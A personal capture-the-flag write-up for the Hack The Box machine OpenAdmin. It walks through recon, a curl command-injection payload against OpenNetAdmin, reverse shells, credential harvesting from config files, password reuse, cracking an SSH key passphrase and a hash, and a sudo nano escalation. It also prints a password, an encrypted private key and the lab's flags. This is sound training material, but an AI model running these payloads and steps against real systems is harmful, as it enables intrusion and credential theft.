# [01 - OpenAdmin](https://app.hackthebox.com/machines/OpenAdmin)

  * [description](#description)
  * [walkthrough](#walkthrough)
    * [recon](#recon)
    * [80](#80)
    * [music](#music)
    * [ONA](#ONA)
    * [pivot from www-data](#pivot-from-www-data)
    * [jimmy on up](#jimmy-on-up)
    * [the last step](#the-last-step)
  * [flag](#flag)
![OpenAdmin.png](OpenAdmin.png)

## description
> 10.10.10.171


## walkthrough

### recon

```
$ nmap -sC -sV -A -Pn -p- openadmin.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-08 16:53 MDT
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.059s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80

hrmm, as expected, it's the default page. going to start with gobuster

```
$ gobuster dir -u http://openadmin.htb -r -f -w ~/git/ctf/tools/wordlists/SecLists/Discovery/Web-Content/common.txt
...
/.hta/                (Status: 403) [Size: 278]
/.htaccess/           (Status: 403) [Size: 278]
/.htpasswd/           (Status: 403) [Size: 278]
/artwork/             (Status: 200) [Size: 14461]
/icons/               (Status: 403) [Size: 278]
/music/               (Status: 200) [Size: 12554]
/server-status/       (Status: 403) [Size: 278]
```

`artwork` and `music` up first


### music

> SOLMusic

has an option to create an account

going to `/category` gives us the ability to play some music, `/playlists` has.. some playlists

`/blog` has a blog.. and the name `Alan Smith`

`/contact` is a path to send some info, but it does not actually POST anything

clicking on 'login' takes us to `/ona` which has a lot going on.

> You are NOT on the latest release version
> Your version    = v18.1.1
> Latest version = Unable to determine
> Please DOWNLOAD the latest version

download is a link to [http://opennetadmin.com/download.html](http://opennetadmin.com/download.html)


additionally see
> Add a DNS domain
> Add a new subnet
> Add a new host
> Perform a search
> List hosts

and currently showing there is 1 DNS domain, which is `openadmin.htb`

looks like ONA does allow `guest` authentication.

and leaks some useful details for later:
```
Database Host	localhost
Database Type	mysqli
Database Name	ona_default
Database User	ona_sys
Database Context	DEFAULT
Database Context Desc	Default data context
```

### ONA

let's see what metasploit has to say
```
msf6 > search opennetadmin

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection

```

but

```
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set RHOST openadmin.htb
RHOST => openadmin.htb
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set LHOST 10.10.14.9
LHOST => 10.10.14.9
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > exploit

[*] Started reverse TCP handler on 10.10.14.9:4444
[*] Exploiting...
[*] Command Stager progress - 100.00% done (703/703 bytes)
[*] Exploit completed, but no session was created.
```

which is strange, because
```
Description:
  This module exploits a command injection in OpenNetAdmin between
  8.5.14 and 18.1.1.
```

noticed this machine is running a little slow, so maybe we're timing out prematurely?

didn't find an easy way to control the timeout, so cooked up this curl:
> $ curl -v -X POST -H "Content-Type: application/x-www-form-urlencoded" http://openadmin.htb/ona/login.php --data-raw "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id;&xajaxargs[]=ping"

and while there was a lot of garbage to parse through, did see
```
<!-- Module Output -->
<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
    <tr>
        <td align="left" class="padding">
            <br>
            <div style="border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;">
                <pre style="padding: 4px;font-family: monospace;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
            </div>
        </td>
    </tr>
</table>
```

ok, to be more clear
```
<pre style="padding: 4px;font-family: monospace;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

so definitely got RCE, it's just ugly. let's make it pretty.

unfortunately, [rs.php](rs.php) gives an error we haven't seen before:
> WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111)


tried a couple other reverse shells, similar issues. ok, going to keep plugging along anyway.

linpeas:
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -

...

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Sudoers file: /etc/sudoers.d/joanna is readable
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv

...


╔══════════╣ Users with console
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
root:x:0:0:root:/root:/bin/bash

...

══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 32 Nov 22  2019 /etc/apache2/sites-enabled/internal.conf -> ../sites-available/internal.conf
Listen 127.0.0.1:52846
<VirtualHost 127.0.0.1:52846>
  ServerName internal.openadmin.htb
  DocumentRoot /var/www/internal
<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 33 Nov 22  2019 /etc/apache2/sites-enabled/openadmin.conf -> ../sites-available/openadmin.conf
<VirtualHost *:80>
        ServerName openadmin.htb
        ServerAdmin jimmy@openadmin.htb
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

...

╔══════════╣ Analyzing Github Files (limit 70)
drwxrwxr-x 8 www-data www-data 4096 Nov 22  2019 /var/www/html/marga/.git

...

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root     root     4096 Jan  4  2020 .
drwxr-xr-x 24 root     root     4096 Aug 17  2021 ..
drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ona
-rw-r--r--  1 root     root        0 Nov 22  2019 priv

```

ok, that's a lot to take in.

  * we're going to need to look at internal.openadmin.htb, but can't do that without a shell
  * users are 'jimmy' and 'joanna', think jimmy first, then joanna


`drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 /var/www/internal`

trying some more one liner reverse shells, because this sucks for recon

```
$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on openadmin.htb 43978
$
```

so the connection is opening, but then immediately being terminated

but.. if we upload the file as a php and then use our RCE:
```
$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on openadmin.htb 43996
/bin/sh: 0: can't access tty; job control turned off
$
```

### pivot from www-data

```
$ mysql
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO)
$ mysql -u ona_sys
ERROR 1045 (28000): Access denied for user 'ona_sys'@'localhost' (using password: NO)
```

ok, so how is the app connecting to the DB?

```
$ find / -iname 'conf*.php' 2>/dev/null
/opt/ona/www/config/config.inc.php
/opt/ona/www/workspace_plugins/builtin/host_actions/config.inc.php
/opt/ona/www/config_dnld.php
/opt/ona/www/modules/ona/configuration.inc.php
```

nothing popping there.

```
$ find / -iname '*db*.php' 2>/dev/null
```

found a lot more, looking at

```
$ cat /opt/ona/www/include/functions_db.inc.php
...

    // Get info from old $db_context[] array if ona_contexts does not exist
    // this is transitional, hopefully I can remove this part soon.
    if (!is_array($ona_contexts) and is_array($db_context)) {
        $type='mysqlt';
        $ona_contexts[$context_name]['databases']['0']['db_type']     = $db_context[$type] [$context_name] ['primary'] ['db_type'];
        $ona_contexts[$context_name]['databases']['0']['db_host']     = $db_context[$type] [$context_name] ['primary'] ['db_host'];
        $ona_contexts[$context_name]['databases']['0']['db_login']    = $db_context[$type] [$context_name] ['primary'] ['db_login'];
        $ona_contexts[$context_name]['databases']['0']['db_passwd']   = $db_context[$type] [$context_name] ['primary'] ['db_passwd'];
        $ona_contexts[$context_name]['databases']['0']['db_database'] = $db_context[$type] [$context_name] ['primary'] ['db_database'];
        $ona_contexts[$context_name]['databases']['0']['db_debug']    = $db_context[$type] [$context_name] ['primary'] ['db_debug'];
        $ona_contexts[$context_name]['databases']['1']['db_type']     = $db_context[$type] [$context_name] ['secondary'] ['db_type'];
        $ona_contexts[$context_name]['databases']['1']['db_host']     = $db_context[$type] [$context_name] ['secondary'] ['db_host'];
        $ona_contexts[$context_name]['databases']['1']['db_login']    = $db_context[$type] [$context_name] ['secondary'] ['db_login'];
        $ona_contexts[$context_name]['databases']['1']['db_passwd']   = $db_context[$type] [$context_name] ['secondary'] ['db_passwd'];
        $ona_contexts[$context_name]['databases']['1']['db_database'] = $db_context[$type] [$context_name] ['secondary'] ['db_database'];
        $ona_contexts[$context_name]['databases']['1']['db_debug']    = $db_context[$type] [$context_name] ['secondary'] ['db_debug'];
        $ona_contexts[$context_name]['description']   = 'Default data context';
        $ona_contexts[$context_name]['context_color'] = '#D3DBFF';
    }

```

```
$ grep -n -iRI "db_passwd"
plugins/ona_nmap_scans/install.php:153:        mysql -u {$self['db_login']} -p{$self['db_passwd']} {$self['db_database']} < {$sqlfile}</font><br><br>
include/functions_db.inc.php:102:        $ona_contexts[$context_name]['databases']['0']['db_passwd']   = $db_context[$type] [$context_name] ['primary'] ['db_passwd'];
include/functions_db.inc.php:108:        $ona_contexts[$context_name]['databases']['1']['db_passwd']   = $db_context[$type] [$context_name] ['secondary'] ['db_passwd'];
include/functions_db.inc.php:150:            $ok1 = $object->PConnect($self['db_host'], $self['db_login'], $db['db_passwd'], $self['db_database']);
local/config/database_settings.inc.php:13:        'db_passwd' => 'n1nj4W4rri0R!',
```

ok, now we're moving

```
$ ssh -l joanna openadmin.htb
Warning: Permanently added 'openadmin.htb' (ED25519) to the list of known hosts.
joanna@openadmin.htb's password:
Permission denied, please try again.
joanna@openadmin.htb's password:

conor@pride:~/git/ctf-meta/htb/machines
 6:04.56 [31232] $ ssh -l jimmy openadmin.htb
Warning: Permanently added 'openadmin.htb' (ED25519) to the list of known hosts.
jimmy@openadmin.htb's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  9 00:05:00 UTC 2022

  System load:  0.08              Processes:             176
  Usage of /:   30.9% of 7.81GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$
```

aww yeah. password reuse for the win

### jimmy on up

```
jimmy@openadmin:~$ sudo - l
[sudo] password for jimmy:
jimmy is not in the sudoers file.  This incident will be reported.
jimmy@openadmin:~$
jimmy@openadmin:~$ sudo -l
[sudo] password for jimmy:
Sorry, user jimmy may not run sudo on openadmin.

mmy@openadmin:~$ crontab -l
no crontab for jimmy
```

hrmm. kicking linpeas over here

```
-rwsr-sr-x 1 root root 107K Jul 12  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)

-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/8039/usr/bin/dotlockfile


╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root     root     4096 Jan  4  2020 .
drwxr-xr-x 24 root     root     4096 Aug 17  2021 ..
drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ona
-rw-r--r--  1 root     root        0 Nov 22  2019 priv

/home/jimmy/.config/lxc/config.yml

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group internal:
/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
```


```
jimmy@openadmin:~$ cat /var/www/internal/index.php
...
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>

```

trying to crack that, but it didn't fall to rockyou, and since we have FS access, kind of unnecessary
...

but while typing that:

```
$ john_rockyou jimmy.hash --format=raw-SHA512-opencl --rules:Jumbo
Device 2: NVIDIA GeForce RTX 2060
Using default input encoding: UTF-8
Loaded 1 password hash (raw-SHA512-opencl [SHA512 OpenCL])
Note: This format may be a lot faster with --mask acceleration (see doc/MASK).
LWS=32 GWS=983040 (30720 blocks)
Press 'q' or Ctrl-C to abort, almost any other key for status
Revealed         (?)
1g 0:00:00:03 DONE (2022-08-08 18:13) 0.3003g/s 4723Kp/s 4723Kc/s 4723KC/s Dev#2:61°C Revealed..Kiaeve
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

real    0m3.754s
user    0m2.691s
sys     0m0.962s
```

nice - but rather than port forwarding unnecessarily
```
jimmy@openadmin:~$ cat /var/www/internal/main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

```

```
jimmy@openadmin:~$ curl -X POST -F "username=jimmy" -F "password=Revealed" http://internal.openadmin.htb

curl: (6) Could not resolve host: internal.openadmin.htb
```

oi.

but that's because we're being flippant. this is the way:

```
jimmy@openadmin:~$ curl -v -X POST -F "login=1" -F "username=jimmy" -F "password=Revealed" -H "Host: internal.openadmin.htb" http://localhost:52846/main.php
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 52846 (#0)
> POST /main.php HTTP/1.1
> Host: internal.openadmin.htb
> User-Agent: curl/7.58.0
> Accept: */*
> Content-Length: 348
> Content-Type: multipart/form-data; boundary=------------------------1787b7076ccbdfb2
>
< HTTP/1.1 302 Found
< Date: Tue, 09 Aug 2022 00:21:24 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Set-Cookie: PHPSESSID=3penuvkj78a2an1jbkef741kv8; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Location: /index.php
< Content-Length: 1902
< Content-Type: text/html; charset=UTF-8
* HTTP error before end of send, stop sending
<
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
* Closing connection 0

```

```
$ ~/git/JohnTheRipper/run/ssh2john.py joanna.key > joanna.hash
$ john_rockyou joanna.hash
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna.key)
1g 0:00:00:01 DONE (2022-08-08 18:23) 0.9009g/s 8625Kp/s 8625Kc/s 8625KC/s bloodrave2..bloodm1st
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

real    0m3.636s
user    0m42.848s
sys     0m0.061s
```

### the last step

```
$ ssh -i joanna.key -l joanna openadmin.htb
Warning: Permanently added 'openadmin.htb' (ED25519) to the list of known hosts.
Enter passphrase for key 'joanna.key':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  9 00:24:17 UTC 2022

  System load:  0.0               Processes:             176
  Usage of /:   31.0% of 7.81GB   Users logged in:       1
  Memory usage: 14%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$

joanna@openadmin:~$ crontab -l 
no crontab for joanna
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

right.. what's the gtfobin for nano?

there are a couple ugly ones.. but since it doesn't drop elevated privileges, can just open `/root/root.txt` after we start with the allowed command.

```
  GNU nano 2.9.3                                                                             /opt/priv                                                                              Modified  

8a395ce7900f8b8e0f645c535a4f3871
```

also - hah, since joanna is the owner of `user.txt`, for the first time, actually took down root before user.

```
joanna@openadmin:~$ cat user.txt 
1147403ea5366837d77bf77ba914d678

```

## flag
```
user:1147403ea5366837d77bf77ba914d678
root:8a395ce7900f8b8e0f645c535a4f3871
```